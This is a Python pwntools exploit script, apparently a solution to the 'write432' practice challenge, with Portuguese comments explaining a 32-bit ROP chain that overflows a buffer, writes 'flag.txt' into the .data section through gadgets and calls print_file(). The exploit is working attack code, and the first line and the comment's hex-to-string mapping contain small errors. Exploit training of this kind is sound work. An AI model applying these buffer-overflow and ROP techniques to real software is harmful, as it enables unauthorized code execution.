#!/usr/bin/env python3

from pwn import *

elf = elf.context = ELF('write432')
p = process(elf.path)

### EXPLAINED ###
'''
Precisamos chamar a função print_file() com o parâmetro flag.txt
Mas temos um problema:
flag.txt = 0x7478742e 0x67616c66

Perceba que juntando os dois valores hexas ultrapassa 4bytes, ficam 8 bytes

flag = 0x7478742e - lenght 4 bytes
.txt = 0x67616c66 - lenght 4 bytes
vamos ter que passar separados pois a arquitetura suporta no máx 4 bytes de endereçamento

E precisamos passar as duas partes separadas por conta do limite de 4 bytes, mas aonde vamos jogar essa string?
Em algum lugar da memória que podemos escrever, isso é, em alguma seção que temos permissão de escrita
podemos visualizar segmentos com o rabin2, segue a syntax: rabin2 -S write432
Retorno interessante:
24  0x00001018    0x8 0x0804a018    0x8 -rw- .data
25  0x00001020    0x0 0x0804a020    0x4 -rw- .bss

Temos essas duas seções comuns, mas qual escolhemos? A .data pelo seu tamanha, ela tem 8 bytes de tamanho, e nossa string flag.txt em hexa tem exatamente 8 bytes
O que faremos é passar a primeira parte "flag" para a .data
E depois somaremos + 4 da .data e passaremos a segunda parte ".txt"

Exemplo:
section .data - 0x8
Endereço inicial(4 bytes) = 0x0804a018 -> aqui vai a nossa primeira parte
Endereço inicial + 4(8 bytes) -> aqui vai a nossa segunda parte

E depois de colocar a nossa string na .data, quando passamos o endereço da .data nela estará a nossa string

Com a .data certinha com nossa string:
chamamos print_file()
passamos .data -> ('flag.txt')
'''

data_section = 0x0804a018 # .data
pop_edi_ebp = p32(0x080485aa) # pop edi ; pop ebp ; ret
mov_edi_ebp = p32(0x08048543) # mov [edi], ebp ; ret
print_file = p32(0x08048538) # print_file()

xpl = b''
xpl += b'A'* 44

# Primeira Parte
xpl += pop_edi_ebp
xpl += p32(data_section)
xpl += b'flag'
xpl += mov_edi_ebp

# Segunda Parte
xpl += pop_edi_ebp
xpl += p32(data_section + 0x4)
xpl += b'.txt'
xpl += mov_edi_ebp

# em data_section está nossa string
xpl += print_file
xpl += p32(data_section)

with open('payload', 'wb') as file:
	file.write(xpl)

p.sendline(xpl)
p.interactive()
